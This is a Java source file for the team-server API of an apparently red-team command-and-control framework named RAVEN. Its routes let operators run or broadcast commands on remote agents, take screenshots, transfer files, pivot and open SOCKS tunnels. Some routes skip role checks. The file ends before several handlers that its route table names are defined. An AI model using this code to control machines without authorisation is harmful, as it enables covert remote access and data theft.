package com.raven.interfaces;

import com.google.gson.Gson;
import com.raven.core.command.ExportCommand;
import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.event.EventManager.EventType;
import com.raven.core.output.EventLog;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.APP.api.AuthApi.TokenInfo;
import com.raven.interfaces.APP.core.HttpRouter;
import com.raven.interfaces.APP.shared.HttpHelper;
import com.raven.interfaces.APP.shared.PathResolver;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public final class TeamServer {

    private static final long TokenTtlMs         = 8L * 60 * 60 * 1000;
    private static final String JsonContentType  = "application/json";

    private static final ThreadLocal<Integer> ResponseStatus = ThreadLocal.withInitial(() -> 200);

    @FunctionalInterface
    private interface RouteHandler {
        String Handle(HttpExchange Exchange, TokenInfo Token) throws Exception;
    }

    private final ServerConfig Config;
    private final ListenerMode Mode;
    private final TeamDatabase Db;
    private final EventLog Log;
    private final ExportCommand Export;
    private final PathResolver PathResolver;
    private final Map<String, TokenInfo> Tokens = new ConcurrentHashMap<>();
    private final Gson Json = new Gson();

    private RavenServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;

    private volatile HttpServer WebPanelHttpServer = null;
    private volatile String WebPanelHost           = null;
    private volatile int WebPanelPort              = -1;

    public TeamServer(ServerConfig Config, ListenerMode Mode) {
        this.Config      = Config;
        this.Mode        = Mode;
        this.Db          = TeamDatabase.Connect(Config);
        this.Log         = new EventLog(Config.GetMaxLogEntries());
        this.Export      = new ExportCommand(Db, Log);
        this.PathResolver = new PathResolver(TeamServer.class);
    }

    private static void SetStatus(int Status) {
        ResponseStatus.set(Status);
    }

    public void RunAsBackend(String ApiHost, int ApiPort) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(ApiHost, ApiPort), 128);
        RegisterRoutesOnServer(HttpSrv);
        HttpSrv.setExecutor(Executors.newFixedThreadPool(32, Task -> {
            Thread Worker = new Thread(Task);
            Worker.setDaemon(true);
            return Worker;
        }));
        HttpSrv.start();
        Logger.Info("RAVEN TeamServer backend running:");
        Logger.Info("  Operator API   : http://" + ApiHost + ":" + ApiPort + "/api/");
        Logger.Info("  Connect CLI    : java -jar raven.jar -TSC -ts " + ApiHost + " -tp " + ApiPort);
        Logger.Info("  Connect Web    : java -jar raven.jar -TSW -ts " + ApiHost + " -tp " + ApiPort + " -wp <port>");
        Logger.Info("  Listener       : use 'start' command in CLI/Web/GUI to configure");
        AddLog("TeamServer backend initialized");
    }

    public void StartWebPanel(String WebHost, int WebPort) throws Exception {
        if (WebPanelHttpServer != null) {
            Logger.Warn("Web panel already running on port " + WebPanelPort);
            return;
        }
        try {
            HttpServer Panel = HttpServer.create(new InetSocketAddress(WebHost, WebPort), 64);
            HttpRouter PanelRouter = new HttpRouter(Panel, Config, PathResolver);
            RegisterRoutesOn(PanelRouter);
            PanelRouter.RegisterStatic();
            Panel.setExecutor(Executors.newFixedThreadPool(8, Task -> {
                Thread Worker = new Thread(Task);
                Worker.setDaemon(true);
                return Worker;
            }));
            Panel.start();
            WebPanelHttpServer = Panel;
            WebPanelHost       = WebHost;
            WebPanelPort       = WebPort;
            String DisplayHost = WebHost.equals("0.0.0.0") ? "localhost" : WebHost;
            Logger.Info("  Web panel         : http://" + DisplayHost + ":" + WebPort + "/");
            AddLog("Web panel started on port " + WebPort);
        } catch (java.net.BindException BindException) {
            throw new Exception("Port " + WebPort + " is already in use — choose a different -wp port");
        }
    }

    public void RunWebFrontend(String BackendHost, int BackendPort, String LocalHost, int LocalPort) throws Exception {
        HttpServer WebSrv;
        try {
            WebSrv = HttpServer.create(new InetSocketAddress(LocalHost, LocalPort), 64);
        } catch (java.net.BindException BindException) {
            throw new Exception(
                "Port " + LocalPort + " is already in use. " +
                "If the backend web panel is running on this port, access it directly or use a different -wp port"
            );
        }
        String ProxyBase = "http://" + BackendHost + ":" + BackendPort;
        WebSrv.createContext("/api/", Exchange -> {
            if (Exchange.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                Exchange.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                Exchange.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
                Exchange.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type,Authorization");
                Exchange.sendResponseHeaders(200, -1);
                return;
            }
            try {
                String Target = ProxyBase + Exchange.getRequestURI().toString();
                java.net.HttpURLConnection Conn = (java.net.HttpURLConnection) new java.net.URL(Target).openConnection();
                Conn.setRequestMethod(Exchange.getRequestMethod());
                Conn.setConnectTimeout(5000);
                Conn.setReadTimeout(30000);
                Exchange.getRequestHeaders().forEach((Key, Values) -> {
                    if (!Key.equalsIgnoreCase("Host") && !Key.equalsIgnoreCase("Transfer-Encoding"))
                        Values.forEach(Value -> Conn.addRequestProperty(Key, Value));
                });
                if (!Exchange.getRequestMethod().equalsIgnoreCase("GET") && !Exchange.getRequestMethod().equalsIgnoreCase("HEAD")) {
                    Conn.setDoOutput(true);
                    byte[] RequestBody = Exchange.getRequestBody().readAllBytes();
                    if (RequestBody.length > 0) Conn.getOutputStream().write(RequestBody);
                }
                int ResponseCode;
                InputStream ResponseStream;
                try {
                    ResponseCode   = Conn.getResponseCode();
                    ResponseStream = Conn.getInputStream();
                } catch (Exception ConnectionException) {
                    ResponseCode   = Conn.getResponseCode();
                    ResponseStream = Conn.getErrorStream();
                }
                byte[] ResponseBody = ResponseStream != null ? ResponseStream.readAllBytes() : new byte[0];
                Conn.getHeaderFields().forEach((Key, Values) -> {
                    if (Key != null && !Key.equalsIgnoreCase("Transfer-Encoding") && !Key.equalsIgnoreCase("Content-Length"))
                        Values.forEach(Value -> Exchange.getResponseHeaders().add(Key, Value));
                });
                Exchange.sendResponseHeaders(ResponseCode, ResponseBody.length);
                Exchange.getResponseBody().write(ResponseBody);
                Exchange.getResponseBody().close();
            } catch (Exception ProxyException) {
                byte[] ErrorBody = ("{\"Error\":\"Backend unavailable: " + ProxyException.getMessage() + "\"}").getBytes(java.nio.charset.StandardCharsets.UTF_8);
                Exchange.getResponseHeaders().set("Content-Type", "application/json");
                Exchange.sendResponseHeaders(502, ErrorBody.length);
                Exchange.getResponseBody().write(ErrorBody);
                Exchange.getResponseBody().close();
            }
        });
        HttpRouter WebRouter = new HttpRouter(WebSrv, Config, PathResolver);
        WebRouter.RegisterStatic();
        WebSrv.setExecutor(Executors.newFixedThreadPool(8, Task -> {
            Thread Worker = new Thread(Task);
            Worker.setDaemon(true);
            return Worker;
        }));
        WebSrv.start();
        String DisplayLocal = LocalHost.equals("0.0.0.0") ? "localhost" : LocalHost;
        Logger.Info("TeamServer web panel (proxy) : http://" + DisplayLocal + ":" + LocalPort + "/");
        Logger.Info("  Proxying API to backend    : http://" + BackendHost + ":" + BackendPort + "/api/");
        AddLog("TSW proxy frontend started on port " + LocalPort + " → backend " + BackendHost + ":" + BackendPort);
    }

    public void RunStandalone(String ApiHost, int ApiPort, String WebHost, int WebPort) throws Exception {
        RunAsBackend(ApiHost, ApiPort);
        HttpServer WebSrv = HttpServer.create(new InetSocketAddress(WebHost, WebPort), 64);
        HttpRouter WebRouter = new HttpRouter(WebSrv, Config, PathResolver);
        RegisterRoutesOn(WebRouter);
        WebRouter.RegisterStatic();
        WebSrv.setExecutor(Executors.newFixedThreadPool(8, Task -> {
            Thread Worker = new Thread(Task);
            Worker.setDaemon(true);
            return Worker;
        }));
        WebSrv.start();
        WebPanelHttpServer = WebSrv;
        WebPanelHost       = WebHost;
        WebPanelPort       = WebPort;
        String DisplayHost = WebHost.equals("0.0.0.0") ? "localhost" : WebHost;
        Logger.Info("  Web frontend   : http://" + DisplayHost + ":" + WebPort + "/");
        AddLog("Web frontend started on port " + WebPort);
    }

    public void Stop() {
        if (Server != null) Server.StopServer();
        if (HttpSrv != null) HttpSrv.stop(1);
        if (WebPanelHttpServer != null) WebPanelHttpServer.stop(0);
        Db.Close();
        Logger.Shutdown();
    }

    private void RegisterRoute(String Path, RouteHandler Handler, boolean RequireAuth) {
        RegisterRouteOn(HttpSrv, Path, Handler, RequireAuth);
    }

    private void RegisterRouteOn(HttpServer Target, String Path, RouteHandler Handler, boolean RequireAuth) {
        Target.createContext(Path, Exchange -> Dispatch(Exchange, Handler, RequireAuth));
    }

    private void RegisterRoutesOn(HttpRouter Router) {
        RegisterRoutesOnServer(Router.GetServer());
    }

    private void RegisterRoutesOnServer(HttpServer Target) {
        RegisterRouteOn(Target, "/api/auth/login",               this::ApiAuthLogin,           false);
        RegisterRouteOn(Target, "/api/auth/logout",              this::ApiAuthLogout,           true);
        RegisterRouteOn(Target, "/api/server/status",            this::ApiServerStatus,         true);
        RegisterRouteOn(Target, "/api/server/start",             this::ApiServerStart,          true);
        RegisterRouteOn(Target, "/api/server/stop",              this::ApiServerStop,           true);
        RegisterRouteOn(Target, "/api/agents",                   this::ApiAgents,               true);
        RegisterRouteOn(Target, "/api/agents/kill",              this::ApiAgentKill,            true);
        RegisterRouteOn(Target, "/api/agents/note",              this::ApiAgentNote,            true);
        RegisterRouteOn(Target, "/api/agents/notes/all",         this::ApiAgentNotesAll,        true);
        RegisterRouteOn(Target, "/api/command/execute",          this::ApiCmdExec,              true);
        RegisterRouteOn(Target, "/api/command/broadcast",        this::ApiCmdBroadcast,         true);
        RegisterRouteOn(Target, "/api/command/broadcastall",     this::ApiCmdBroadcastAll,      true);
        RegisterRouteOn(Target, "/api/command/history",          this::ApiCmdHistory,           true);
        RegisterRouteOn(Target, "/api/command/screenshot",       this::ApiCmdScreenshot,        true);
        RegisterRouteOn(Target, "/api/command/download",         this::ApiCmdDownload,          true);
        RegisterRouteOn(Target, "/api/command/upload",           this::ApiCmdUpload,            true);
        RegisterRouteOn(Target, "/api/command/sleep",            this::ApiCmdSleep,             true);
        RegisterRouteOn(Target, "/api/command/pivot",            this::ApiCmdPivot,             true);
        RegisterRouteOn(Target, "/api/command/portfwd",          this::ApiCmdPortfwd,           true);
        RegisterRouteOn(Target, "/api/command/socks",            this::ApiCmdSocks,             true);
        RegisterRouteOn(Target, "/api/sessions/history",         this::ApiSessionHistory,       true);
        RegisterRouteOn(Target, "/api/logs",                     this::ApiLogs,                 true);
        RegisterRouteOn(Target, "/api/export",                   this::ApiExport,               true);
        RegisterRouteOn(Target, "/api/team/operators",           this::ApiOpList,               true);
        RegisterRouteOn(Target, "/api/team/operators/create",    this::ApiOpCreate,             true);
        RegisterRouteOn(Target, "/api/team/operators/delete",    this::ApiOpDelete,             true);
        RegisterRouteOn(Target, "/api/team/operators/role",      this::ApiOpRole,               true);
        RegisterRouteOn(Target, "/api/team/operators/password",  this::ApiOpPassword,           true);
        RegisterRouteOn(Target, "/api/team/operators/kick",      this::ApiOpKick,               true);
        RegisterRouteOn(Target, "/api/team/roles",               this::ApiRoles,                true);
        RegisterRouteOn(Target, "/api/server/webpanel/start",    this::ApiWebPanelStart,        true);
        RegisterRouteOn(Target, "/api/server/webpanel/stop",     this::ApiWebPanelStop,         true);
        RegisterRouteOn(Target, "/api/server/webpanel/status",   this::ApiWebPanelStatus,       true);
        RegisterRouteOn(Target, "/api/tasks",                    this::ApiTasks,                true);
        RegisterRouteOn(Target, "/api/team/chat/send",           this::ApiChatSend,             true);
        RegisterRouteOn(Target, "/api/team/chat/messages",       this::ApiChatMessages,         true);
        RegisterRouteOn(Target, "/api/team/chat/logs",           this::ApiChatLogs,             true);
    }

    private void Dispatch(HttpExchange Exchange, RouteHandler Handler, boolean RequireAuth) {
        ResponseStatus.set(200);
        try {
            TokenInfo Token = null;
            if (RequireAuth) {
                String Header = Exchange.getRequestHeaders().getFirst("Authorization");
                if (Header == null || !Header.startsWith("Bearer ")) {
                    Respond(Exchange, 401, Map.of("Error", "Unauthorized"));
                    return;
                }
                Token = Tokens.get(Header.substring(7));
                if (Token == null || Token.ExpiresAt() < System.currentTimeMillis()) {
                    Tokens.entrySet().removeIf(Entry -> Entry.getValue().ExpiresAt() < System.currentTimeMillis());
                    Respond(Exchange, 401, Map.of("Error", "Token expired or invalid"));
                    return;
                }
            }
            String Result = Handler.Handle(Exchange, Token);
            int Status = ResponseStatus.get();
            byte[] Bytes = Result.getBytes("UTF-8");
            Exchange.getResponseHeaders().set("Content-Type", JsonContentType);
            Exchange.getResponseHeaders().set("X-Content-Type-Options", "nosniff");
            Exchange.sendResponseHeaders(Status, Bytes.length);
            try (OutputStream Out = Exchange.getResponseBody()) {
                Out.write(Bytes);
            }
        } catch (Exception Exception) {
            try {
                Respond(Exchange, 500, Map.of("Error", Exception.getMessage() != null ? Exception.getMessage() : "Internal error"));
            } catch (Exception Ignored) {}
        }
    }

    private void Respond(HttpExchange Exchange, int Status, Object Body) throws IOException {
        byte[] Bytes = HttpHelper.Json(Body).getBytes("UTF-8");
        Exchange.getResponseHeaders().set("Content-Type", JsonContentType);
        Exchange.sendResponseHeaders(Status, Bytes.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private Map<String, Object> Body(HttpExchange Exchange) throws Exception {
        try (InputStream In = Exchange.getRequestBody()) {
            byte[] Raw = In.readAllBytes();
            if (Raw.length == 0) return new HashMap<>();
            @SuppressWarnings("unchecked")
            Map<String, Object> Parsed = Json.fromJson(new String(Raw, "UTF-8"), Map.class);
            return Parsed != null ? Parsed : new HashMap<>();
        }
    }

    private String Str(Map<String, Object> DataMap, String Key, String Default) { return HttpHelper.Str(DataMap, Key, Default); }
    private int    Num(Map<String, Object> DataMap, String Key, int Default)    { return HttpHelper.Num(DataMap, Key, Default); }

    private void AddLog(String Message) {
        Log.Add(Message, false);
        Db.SaveLog(Message);
    }

    private String Uptime() {
        if (ServerStartTime == null) return "00:00:00";
        return SystemHelper.FormatUptime(Duration.between(ServerStartTime, Instant.now()).getSeconds());
    }

    private String ApiAuthLogin(HttpExchange Exchange, TokenInfo Ignored) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        String Username = Str(RequestBody, "Username", "");
        String Password = Str(RequestBody, "Password", "");
        if (Username.isEmpty() || Password.isEmpty()) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "Username and Password required"));
        }
        if (!Db.ValidateOperator(Username, Password)) {
            SetStatus(401);
            return HttpHelper.Json(Map.of("Error", "Invalid credentials"));
        }
        OperatorRole Role = Db.GetOperatorRole(Username);
        Db.UpdateLastSeen(Username);
        String Token = UUID.randomUUID().toString().replace("-", "");
        Tokens.put(Token, new TokenInfo(Username, Role, System.currentTimeMillis() + TokenTtlMs));
        Logger.Info("[AUTH] Login: " + Username + " [" + Role + "]");
        AddLog("[AUTH] Login: " + Username + " [" + Role + "]");
        return HttpHelper.Json(Map.of(
            "Token",       Token,
            "Role",        Role.name(),
            "Username",    Username,
            "Permissions", Role.PermissionString(),
            "ExpiresIn",   TokenTtlMs / 1000
        ));
    }

    private String ApiAuthLogout(HttpExchange Exchange, TokenInfo Token) throws Exception {
        String Header = Exchange.getRequestHeaders().getFirst("Authorization");
        if (Header != null && Header.startsWith("Bearer ")) {
            Tokens.remove(Header.substring(7));
            AddLog("[AUTH] Logout: " + Token.Username());
        }
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiServerStatus(HttpExchange Exchange, TokenInfo Token) {
        boolean Up = Server != null && Server.IsRunning();
        Map<String, Object> Response = new LinkedHashMap<>();
        Response.put("Status",         Up ? "Online" : "Offline");
        Response.put("Mode",           Mode.name());
        Response.put("Host",           Up ? Server.GetHost() : Config.GetServerHost());
        Response.put("Port",           Up ? Server.GetPort() : Config.GetServerPort());
        Response.put("Agents",         Up ? Server.GetSessions().Count() : 0);
        Response.put("Uptime",         Uptime());
        Response.put("Operator",       Token.Username());
        Response.put("Role",           Token.Role().name());
        Response.put("Permissions",    Token.Role().PermissionString());
        Response.put("DbType",         Config.GetDatabaseType());
        Response.put("DbOnline",       Db.IsConnected());
        Response.put("SleepIntervalMs", Config.GetSleepIntervalMs());
        Response.put("JitterMs",        Config.GetJitterMs());
        Response.put("LogCount",        Log.Count());
        if (Up) Response.put("Key", Server.GetKeyBase64());
        return HttpHelper.Json(Response);
    }

    private String ApiServerStart(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        }
        if (Server != null && Server.IsRunning()) {
            SetStatus(409);
            return HttpHelper.Json(Map.of("Error", "Listener already running"));
        }
        Map<String, Object> RequestBody = Body(Exchange);
        String Host    = Str(RequestBody, "Host", Config.GetServerHost());
        int Port       = Num(RequestBody, "Port", Config.GetServerPort());
        String ModeStr = Str(RequestBody, "Mode", "MULTI").toUpperCase();
        ListenerMode ListenMode;
        try { ListenMode = ListenerMode.valueOf(ModeStr); }
        catch (IllegalArgumentException Ex) { ListenMode = ListenerMode.FromString(ModeStr.toLowerCase()); }
        Server = new RavenServer(Host, Port, ListenMode, Config);
        Server.AddEventListener(this::OnEvent);
        if (!Server.StartServer()[0]) {
            Server = null;
            SetStatus(500);
            return HttpHelper.Json(Map.of("Error", "Failed to start listener on " + Host + ":" + Port));
        }
        ServerStartTime = Instant.now();
        Thread AcceptThread = new Thread(Server::AcceptConnections, "AcceptConnections");
        AcceptThread.setDaemon(true);
        AcceptThread.start();
        return HttpHelper.Json(Map.of("Success", true, "Host", Host, "Port", Port, "Mode", ListenMode.name()));
    }

    private String ApiServerStop(HttpExchange Exchange, TokenInfo Token) {
        if (!Token.Role().CanManage()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        }
        if (Server == null || !Server.IsRunning()) {
            SetStatus(409);
            return HttpHelper.Json(Map.of("Error", "Listener not running"));
        }
        RavenServer ToStop = Server;
        Server = null;
        ServerStartTime = null;
        AddLog("Listener stopped by " + Token.Username());
        Thread Stopper = new Thread(() -> {
            try { Thread.sleep(200); } catch (InterruptedException Ignored) {}
            ToStop.StopServer();
        }, "ListenerStopper");
        Stopper.setDaemon(true);
        Stopper.start();
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiAgents(HttpExchange Exchange, TokenInfo Token) {
        if (Server == null || !Server.IsRunning()) return HttpHelper.Json(Map.of("Agents", List.of()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session AgentSession : Server.GetSessions().GetAll()) {
            Map<String, Object> Agent = new LinkedHashMap<>();
            Agent.put("ID",          AgentSession.GetId());
            Agent.put("AgentName",   AgentSession.GetAgentName());
            Agent.put("Hostname",    AgentSession.GetHostname());
            Agent.put("OS",          AgentSession.GetOs());
            Agent.put("User",        AgentSession.GetUser());
            Agent.put("Arch",        AgentSession.GetArch());
            Agent.put("AgentIP",     AgentSession.GetAgentIp());
            Agent.put("JoinedAt",    AgentSession.GetJoinedAt());
            Agent.put("Type",        AgentSession.GetSessionType().name());
            Agent.put("ShellMode",   AgentSession.GetShellMode());
            Agent.put("Encrypted",   AgentSession.IsEncrypted());
            Agent.put("MtlsEnabled", AgentSession.IsMtlsEnabled());
            Agent.put("SessionKey",  AgentSession.GetSessionKey());
            Agent.put("Note",        Db.GetAgentNote(AgentSession.GetId()));
            Agents.add(Agent);
        }
        return HttpHelper.Json(Map.of("Agents", Agents, "Count", Agents.size()));
    }

    private String ApiAgentKill(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanKillSession()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "ADMIN role required"));
        }
        if (Server == null || !Server.IsRunning()) {
            SetStatus(503);
            return HttpHelper.Json(Map.of("Error", "Server not running"));
        }
        int AgentId = Num(Body(Exchange), "AgentId", 0);
        if (AgentId == 0) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "AgentId required"));
        }
        Server.RemoveSession(AgentId);
        AddLog("[KILL] session-" + AgentId + " by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiAgentNote(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId   = Num(RequestBody, "AgentId", 0);
        String Note   = Str(RequestBody, "Note", "");
        if (AgentId == 0) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "AgentId required"));
        }
        Db.SetAgentNote(AgentId, Note);
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiAgentNotesAll(HttpExchange Exchange, TokenInfo Token) {
        return HttpHelper.Json(Map.of("Notes", Db.GetAllAgentNotes()));
    }

    private String ApiCmdExec(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanExecute()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        }
        if (Server == null || !Server.IsRunning()) {
            SetStatus(503);
            return HttpHelper.Json(Map.of("Error", "Server not running"));
        }
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId    = Num(RequestBody, "AgentId", 0);
        String Command = Str(RequestBody, "Command", "");
        if (AgentId == 0 || Command.isEmpty()) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
        }
        AddLog("[>] [" + Token.Username() + "] session-" + AgentId + " » " + Command);
        String[] Result = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Token.Username(), Command, Result[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
    }

    private String ApiCmdBroadcast(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanBroadcast()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        }
        if (Server == null || !Server.IsRunning()) {
            SetStatus(503);
            return HttpHelper.Json(Map.of("Error", "Server not running"));
        }
        Map<String, Object> RequestBody = Body(Exchange);
        String Command = Str(RequestBody, "Command", "");
        if (Command.isEmpty()) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "Command required"));
        }
        @SuppressWarnings("unchecked")
        List<Object> RawIds = (List<Object>) RequestBody.getOrDefault("AgentIds", List.of());
        List<Integer> Ids = new ArrayList<>();
        for (Object RawId : RawIds)
            try { Ids.add((int) Double.parseDouble(RawId.toString())); } catch (Exception Ignored) {}
        if (Ids.isEmpty()) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "AgentIds required"));
        }
        AddLog("[BROADCAST] [" + Token.Username() + "] > " + Ids.size() + " agents » " + Command);
        return BuildBroadcastResult(Server.BroadcastCommand(Ids, Command), Token.Username(), Command);
    }

    private String ApiCmdBroadcastAll(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanBroadcast()) {
            SetStatus(403);
            return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required"));
        }
        if (Server == null || !Server.IsRunning()) {
            SetStatus(503);
            return HttpHelper.Json(Map.of("Error", "Server not running"));
        }
        String Command = Str(Body(Exchange), "Command", "");
        if (Command.isEmpty()) {
            SetStatus(400);
            return HttpHelper.Json(Map.of("Error", "Command required"));
        }
        AddLog("[BROADCAST-ALL] [" + Token.Username() + "] > " + Server.GetSessions().Count() + " agents » " + Command);
        return BuildBroadcastResult(Server.BroadcastAll(Command), Token.Username(), Command);
    }

    private String BuildBroadcastResult(Map<Integer, String[]> Results, String Operator, String Command) {
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> Entry : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(Entry.getValue()[0]);
            Out.put(String.valueOf(Entry.getKey()), Map.of("Success", Ok, "Output", Entry.getValue()[1]));
            Db.SaveCommandLog(Entry.getKey(), Operator, Command, Entry.getValue()[1], Ok);
        }
        return HttpHelper.Json(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiCmdScreenshot(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanExecute()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required")); }
        int AgentId = Num(Body(Exchange), "AgentId", 0);
        if (AgentId == 0 || Server == null) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "screenshot");
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Token.Username(), "screenshot", Result[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", Result[1]));
    }

    private String ApiCmdDownload(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanExecute()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required")); }
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId    = Num(RequestBody, "AgentId", 0);
        String Path    = Str(RequestBody, "Path", "");
        if (AgentId == 0 || Path.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId and Path required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "download " + Path);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Token.Username(), "download " + Path, Result[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", Result[1]));
    }

    private String ApiCmdUpload(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanExecute()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "OPERATOR or ADMIN role required")); }
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId       = Num(RequestBody, "AgentId", 0);
        String LocalPath  = Str(RequestBody, "LocalPath", "");
        String RemotePath = Str(RequestBody, "RemotePath", "");
        if (AgentId == 0 || LocalPath.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "upload " + LocalPath + (RemotePath.isEmpty() ? "" : " " + RemotePath));
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Token.Username(), "upload " + LocalPath, Result[1], Ok);
        return HttpHelper.Json(Map.of("Success", Ok, "Output", Result[1]));
    }

    private String ApiCmdSleep(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId  = Num(RequestBody, "AgentId", 0);
        String Secs  = Str(RequestBody, "Seconds", "");
        if (AgentId == 0 || Secs.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId and Seconds required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "sleep " + Secs);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(Result[0]), "Output", Result[1]));
    }

    private String ApiCmdPivot(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId    = Num(RequestBody, "AgentId", 0);
        String Target  = Str(RequestBody, "Target", "");
        if (AgentId == 0 || Target.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId and Target required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "pivot " + Target);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(Result[0]), "Output", Result[1]));
    }

    private String ApiCmdPortfwd(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId = Num(RequestBody, "AgentId", 0);
        int Lport   = Num(RequestBody, "Lport", 0);
        String Rhost = Str(RequestBody, "Rhost", "");
        int Rport   = Num(RequestBody, "Rport", 0);
        if (AgentId == 0 || Lport == 0 || Rhost.isEmpty() || Rport == 0) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId, Lport, Rhost, Rport required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "portfwd " + Lport + " " + Rhost + " " + Rport);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(Result[0]), "Output", Result[1]));
    }

    private String ApiCmdSocks(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        int AgentId = Num(RequestBody, "AgentId", 0);
        int Lport   = Num(RequestBody, "Lport", 0);
        if (AgentId == 0 || Lport == 0) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "AgentId and Lport required")); }
        String[] Result = Server.ExecuteCommand(AgentId, "socks " + Lport);
        return HttpHelper.Json(Map.of("Success", Boolean.parseBoolean(Result[0]), "Output", Result[1]));
    }

    private String ApiCmdHistory(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        return HttpHelper.Json(Map.of("History", Db.GetCommandHistory(Num(RequestBody, "AgentId", 0), Num(RequestBody, "Limit", 100))));
    }

    private String ApiSessionHistory(HttpExchange Exchange, TokenInfo Token) throws Exception {
        int Limit = Num(Body(Exchange), "Limit", 100);
        return HttpHelper.Json(Map.of("Sessions", Db.GetSessionHistory(Math.min(Limit, 1000))));
    }

    private String ApiLogs(HttpExchange Exchange, TokenInfo Token) {
        return HttpHelper.Json(Map.of("Logs", Log.GetAll(), "Count", Log.Count()));
    }

    private String ApiExport(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        String Target = Str(RequestBody, "Target", "");
        String Format = Str(RequestBody, "Format", "json");
        if (Target.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Target required")); }
        Export.Run(Target, Format);
        return HttpHelper.Json(Map.of("Success", true, "Target", Target, "Format", Format));
    }

